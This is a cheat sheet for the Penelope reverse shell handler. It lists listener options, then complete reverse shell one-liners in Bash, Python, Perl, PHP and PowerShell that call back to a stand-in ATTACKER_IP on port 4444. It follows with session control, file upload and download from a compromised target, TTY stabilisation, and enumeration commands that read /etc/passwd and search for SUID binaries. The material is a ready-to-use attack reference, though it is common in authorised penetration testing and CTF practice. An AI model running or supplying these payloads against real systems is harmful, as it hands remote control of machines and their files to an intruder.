---
title: "Penelope CHEATSHEET"
description: "Quick reference for Penelope reverse shell handler"
---

# Penelope CHEATSHEET

## Start Listener

```bash
python3 penelope.py                           # Default port 1337
python3 penelope.py -p 4444                   # Custom port
python3 penelope.py -v                        # Verbose mode
python3 penelope.py --banner "Custom"         # Custom banner
python3 penelope.py --log /tmp/penelope.log   # Log activity
```

## Target Reverse Shells

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# PHP
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# PowerShell (Windows)
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Session Management

```
sessions                                  # List all sessions
sessions -i 1                             # Interact with session 1
sessions -k 2                             # Kill session 2
background                                # Background current session
```

## Post-Exploitation Commands

```
# On Penelope prompt
upload /local/file /remote/file            # Upload file to target
download /remote/file /local/file          # Download file from target
```

## TTY Stabilization (Manual)

```bash
# On target shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo; fg
export TERM=xterm
export SHELL=/bin/bash
```

## System Enumeration

```bash
whoami && id
uname -a
cat /etc/os-release
ifconfig || ip a
netstat -tlnp || ss -tlnp
cat /etc/passwd
find / -perm -4000 2>/dev/null
```
